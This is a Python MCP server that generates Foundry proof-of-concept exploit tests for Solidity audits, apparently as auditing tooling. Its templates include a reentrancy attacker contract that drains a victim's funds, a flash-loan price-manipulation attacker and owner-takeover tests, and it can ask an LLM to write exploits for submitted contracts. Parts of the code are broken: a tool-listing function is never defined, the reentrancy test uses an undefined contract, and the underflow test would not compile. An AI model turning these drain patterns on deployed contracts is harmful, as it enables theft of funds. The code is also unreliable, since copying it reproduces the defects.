#!/usr/bin/env python3
"""
MCP Server: PoC Generator
Generates Foundry-based Proof of Concept exploit test contracts for Solidity vulnerabilities.
"""
import sys
import json
import asyncio
import logging
import os
import re

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("poc_generator")

TOOL_NAME = "poc_generator"
TOOL_VERSION = "1.0.0"

# Template-based PoC generation patterns
VULNERABILITY_TEMPLATES = {
    "reentrancy": {
        "imports": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"forge-std/Test.sol\";",
        "description": "Reentrancy attack exploiting external call before state update",
        "template": """
/// @notice PoC: Reentrancy Attack
/// @dev This test demonstrates a reentrancy vulnerability where an attacker
///      can re-enter the vulnerable function during an external call.
contract ReentrancyAttacker {{
    address public target;
    uint256 public attackCount;

    constructor(address _target) {{
        target = _target;
    }}

    function attack() external payable {{
        // Trigger the vulnerable function
        ITarget(target).deposit{{value: msg.value}}();
        ITarget(target).withdraw();
    }}

    receive() external payable {{
        if (address(target).balance >= msg.value) {{
            attackCount++;
            if (attackCount < 10) {{
                ITarget(target).withdraw();
            }}
        }}
    }}
}}

interface ITarget {{
    function deposit() external payable;
    function withdraw() external;
}}

contract ReentrancyPoCTest is Test {{
    Target victim;
    ReentrancyAttacker attacker;

    function setUp() public {{
        victim = new Target();
        attacker = new ReentrancyAttacker(address(victim));
        vm.deal(address(attacker), 10 ether);
    }}

    function test_reentrancy_exploit() public {{
        uint256 initialBalance = address(victim).balance;

        vm.startPrank(address(attacker));
        attacker.attack{{value: 1 ether}}();
        vm.stopPrank();

        // After reentrancy, the attacker should have drained more than deposited
        uint256 stolen = address(attacker).balance - 1 ether;
        assertGt(stolen, 0, "Reentrancy attack should steal funds");

        emit log_named_uint("Funds stolen (wei)", stolen);
        emit log_named_uint("Victim remaining balance", address(victim).balance);
    }}
}}
"""
    },
    "integer_overflow": {
        "imports": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"forge-std/Test.sol\";",
        "description": "Integer overflow/underflow exploitation",
        "template": """
/// @notice PoC: Integer Overflow/Underflow
/// @dev Pre-0.8.0 contracts may be vulnerable. Solidity 0.8+ has built-in checks.
contract IntegerOverflowPoCTest is Test {{
    function setUp() public {{}}

    function test_overflow_detection() public {{
        // Demonstrate overflow behavior
        uint256 maxVal = type(uint256).max;

        // In Solidity 0.8+, this will revert
        vm.expectRevert();
        uint256 overflow = maxVal + 1;

        // For pre-0.8.0 contracts, use unchecked
        unchecked {{
            uint256 overflowResult = maxVal + 1;
            assertEq(overflowResult, 0, "Overflow should wrap to 0");
        }}
    }}

    function test_underflow_detection() public {{
        // Demonstrate underflow behavior
        vm.expectRevert();
        uint256 underflow = 0 - 1;

        unchecked {{
            uint256 underflowResult = 0 - 1;
            assertEq(underflowResult, type(uint256).max, "Underflow should wrap to max");
        }}
    }}
}}
"""
    },
    "access_control": {
        "imports": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"forge-std/Test.sol\";",
        "description": "Access control bypass exploitation",
        "template": """
/// @notice PoC: Access Control Vulnerability
/// @dev Demonstrates missing or broken access control on critical functions.
interface IVulnerableContract {{
    function criticalFunction() external;
    function withdrawFunds(address to) external;
    function setOwner(address newOwner) external;
}}

contract AccessControlPoCTest is Test {{
    IVulnerableContract target;
    address attacker = address(0xBEEF);

    function setUp() public {{
        // Deploy target contract
        // target = IVulnerableContract(address(deployedContract));
    }}

    function test_unauthorized_access() public {{
        vm.startPrank(attacker);

        // Attempt to call privileged function without authorization
        // This should revert if access control is properly implemented
        vm.expectRevert();
        target.criticalFunction();

        vm.stopPrank();
    }}

    function test_unauthorized_withdraw() public {{
        vm.startPrank(attacker);

        // Attempt to withdraw funds
        vm.expectRevert();
        target.withdrawFunds(attacker);

        vm.stopPrank();
    }}

    function test_owner_takeover() public {{
        vm.startPrank(attacker);

        // Attempt to change owner
        vm.expectRevert();
        target.setOwner(attacker);

        vm.stopPrank();
    }}
}}
"""
    },
    "flash_loan": {
        "imports": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"forge-std/Test.sol\";",
        "description": "Flash loan attack vector",
        "template": """
/// @notice PoC: Flash Loan Attack
/// @dev Demonstrates a flash loan attack pattern that can be used to
///      manipulate prices or drain liquidity pools.

interface IFlashLoanProvider {{
    function flashLoan(uint256 amount, address receiver, bytes calldata data) external;
    function getReserve() external view returns (uint256);
}}

interface IVulnerableProtocol {{
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function getPrice() external view returns (uint256);
    function swap(address tokenIn, uint256 amountIn) external returns (uint256);
}}

contract FlashLoanAttacker {{
    IFlashLoanProvider lender;
    IVulnerableProtocol target;
    uint256 profit;

    constructor(address _lender, address _target) {{
        lender = IFlashLoanProvider(_lender);
        target = IVulnerableProtocol(_target);
    }}

    function executeAttack(uint256 flashAmount) external {{
        lender.flashLoan(flashAmount, address(this), "");
    }}

    function executeOperation(uint256 amount, bytes calldata) external {{
        // Step 1: Use flash loan to manipulate price
        // Step 2: Exploit the manipulated price
        // Step 3: Repay loan and keep profit

        // Example: price manipulation
        target.swap(address(this), amount);

        // Repay flash loan (amount + fee)
        uint256 fee = amount * 9 / 10000; // 0.09% fee
        IERC20(address(lender)).transfer(address(lender), amount + fee);

        profit = amount - fee;
    }}
}}

interface IERC20 {{
    function transfer(address to, uint256 amount) external returns (bool);
}}

contract FlashLoanPoCTest is Test {{
    function test_flash_loan_attack() public {{
        // Setup: deploy or fork the target protocol
        // FlashLoanAttacker attacker = new FlashLoanAttacker(lender, target);
        // attacker.executeAttack(1000000e18);
        // assertGt(attacker.profit(), 0);
    }}
}}
"""
    },
    "default": {
        "imports": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"forge-std/Test.sol\";",
        "description": "Generic vulnerability PoC template",
        "template": """
/// @notice PoC: {vuln_type}
/// @dev {vuln_description}
///
/// Vulnerability Details:
/// {detailed_description}
contract PoCTest is Test {{

    function setUp() public {{
        // Deploy or setup the target contract
    }}

    function test_exploit() public {{
        // Step 1: Setup attack prerequisites
        // Step 2: Execute the exploit
        // Step 3: Verify the exploit succeeded

        // TODO: Implement specific exploit logic based on vulnerability analysis

        emit log("PoC test template - customize based on specific vulnerability");
    }}
}}
"""
    }
}


def generate_template_poc(contract_code: str, vulnerability: dict) -> dict:
    """Generate a template-based PoC for the given vulnerability."""
    vuln_type = vulnerability.get("type", "").lower().replace(" ", "_").replace("-", "_")
    vuln_description = vulnerability.get("description", "No description provided")

    # Match to known templates
    matched_template = None
    for key in VULNERABILITY_TEMPLATES:
        if key in vuln_type or vuln_type in key:
            matched_template = VULNERABILITY_TEMPLATES[key]
            break

    if not matched_template:
        matched_template = VULNERABILITY_TEMPLATES["default"]

    # Build the PoC contract
    poc_code = matched_template["imports"] + "\n\n"

    # Add contract code reference as comment
    poc_code += "/*\n"
    poc_code += " * Original Contract (reference):\n"
    # Limit contract code in comments to avoid huge PoC files
    code_lines = contract_code.split("\n")[:50]
    for line in code_lines:
        poc_code += f" * {line}\n"
    if len(contract_code.split("\n")) > 50:
        poc_code += f" * ... ({len(contract_code.split(chr(10)))} lines total)\n"
    poc_code += " */\n\n"

    # Add the PoC template with formatting
    if matched_template == VULNERABILITY_TEMPLATES["default"]:
        poc_code += matched_template["template"].format(
            vuln_type=vulnerability.get("type", "Unknown"),
            vuln_description=vuln_description,
            detailed_description=vuln_description
        )
    else:
        poc_code += matched_template["template"]

    return {
        "success": True,
        "vulnerability_type": vulnerability.get("type", "Unknown"),
        "poc_code": poc_code,
        "template_used": vuln_type if any(k in vuln_type for k in VULNERABILITY_TEMPLATES) else "default",
        "note": "This is a template-based PoC. Customize the exploit logic based on the specific contract under audit."
    }


async def generate_with_llm(contract_code: str, vulnerability: dict) -> dict:
    """Attempt LLM-based PoC generation (optional, falls back to template)."""
    # Check for OpenAI-compatible API endpoint
    api_base = os.environ.get("OPENAI_API_BASE", os.environ.get("LLM_API_BASE", ""))
    api_key = os.environ.get("OPENAI_API_KEY", os.environ.get("LLM_API_KEY", ""))
    model = os.environ.get("LLM_MODEL", "gpt-4")

    if not api_base or not api_key:
        logger.info("No LLM API configured, falling back to template-based generation")
        return None

    try:
        import aiohttp

        prompt = f"""You are a smart contract security expert. Generate a Foundry test contract that demonstrates the following vulnerability.

VULNERABILITY:
Type: {vulnerability.get('type', 'Unknown')}
Description: {vulnerability.get('description', '')}

TARGET CONTRACT CODE:
```solidity
{contract_code[:4000]}
```

Requirements:
1. Use pragma solidity ^0.8.20
2. Import forge-std/Test.sol
3. Include a setUp() function
4. Include a test_exploit() function that demonstrates the vulnerability
5. Use vm.startPrank, vm.deal, etc. for test setup
6. Add detailed comments explaining each step of the exploit
7. The test should fail if the vulnerability is fixed

Return ONLY the Solidity code, no explanation."""

        async with aiohttp.ClientSession() as session:
            async with session.post(
                f"{api_base}/v1/chat/completions",
                headers={
                    "Authorization": f"Bearer {api_key}",
                    "Content-Type": "application/json"
                },
                json={
                    "model": model,
                    "messages": [
                        {"role": "system", "content": "You are a Solidity security expert."},
                        {"role": "user", "content": prompt}
                    ],
                    "temperature": 0.3,
                    "max_tokens": 4096
                }
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    poc_code = data["choices"][0]["message"]["content"]

                    # Extract code from markdown blocks if present
                    code_match = re.search(r'```(?:solidity)?\n(.*?)```', poc_code, re.DOTALL)
                    if code_match:
                        poc_code = code_match.group(1)

                    return {
                        "success": True,
                        "vulnerability_type": vulnerability.get("type", "Unknown"),
                        "poc_code": poc_code,
                        "template_used": "llm-generated",
                        "model": model,
                        "note": "This PoC was generated by an LLM. Review and test before use."
                    }
    except Exception as e:
        logger.warning(f"LLM generation failed: {e}, falling back to template")

    return None


async def execute_tool(tool_name: str, arguments: dict) -> dict:
    if tool_name == "generate_poc":
        contract_code = arguments.get("contract_code", "")
        vulnerability = arguments.get("vulnerability", {})

        if not contract_code:
            return {"success": False, "error": "contract_code is required"}
        if not vulnerability:
            return {"success": False, "error": "vulnerability object is required"}

        # Try LLM generation first, fall back to template
        llm_result = await generate_with_llm(contract_code, vulnerability)
        if llm_result:
            return llm_result

        return generate_template_poc(contract_code, vulnerability)

    return {"success": False, "error": f"Unknown tool: {tool_name}"}


async def handle_request(request: dict) -> dict:
    method = request.get("method")
    params = request.get("params", {})

    if method == "initialize":
        return {
            "protocolVersion": "2024-11-05",
            "capabilities": {"tools": {}},
            "serverInfo": {"name": TOOL_NAME, "version": TOOL_VERSION}
        }
    elif method == "tools/list":
        return {"tools": build_tool_definitions()}
    elif method == "tools/call":
        tool_name = params.get("name")
        arguments = params.get("arguments", {})
        result = await execute_tool(tool_name, arguments)
        return {"content": [{"type": "text", "text": json.dumps(result, indent=2)}]}
    elif method == "ping":
        return {}
    return {"error": {"code": -32601, "message": f"Method not found: {method}"}}


async def main():
    reader = asyncio.StreamReader()
    protocol = asyncio.StreamReaderProtocol(reader)
    loop = asyncio.get_event_loop()
    await loop.connect_read_pipe(lambda: protocol, sys.stdin)

    logger.info(f"{TOOL_NAME} MCP server started")

    while True:
        line = await reader.readline()
        if not line:
            break

        line_str = line.decode("utf-8").strip()
        if not line_str:
            continue

        try:
            request = json.loads(line_str)
            response = await handle_request(request)
            response["jsonrpc"] = "2.0"
            response["id"] = request.get("id")
            sys.stdout.write(json.dumps(response) + "\n")
            sys.stdout.flush()
        except json.JSONDecodeError:
            error_resp = {
                "jsonrpc": "2.0",
                "id": None,
                "error": {"code": -32700, "message": "Parse error"}
            }
            sys.stdout.write(json.dumps(error_resp) + "\n")
            sys.stdout.flush()
        except Exception as e:
            logger.exception("Error handling request")
            error_resp = {
                "jsonrpc": "2.0",
                "id": request.get("id") if "request" in dir() else None,
                "error": {"code": -32603, "message": f"Internal error: {str(e)}"}
            }
            sys.stdout.write(json.dumps(error_resp) + "\n")
            sys.stdout.flush()


if __name__ == "__main__":
    asyncio.run(main())
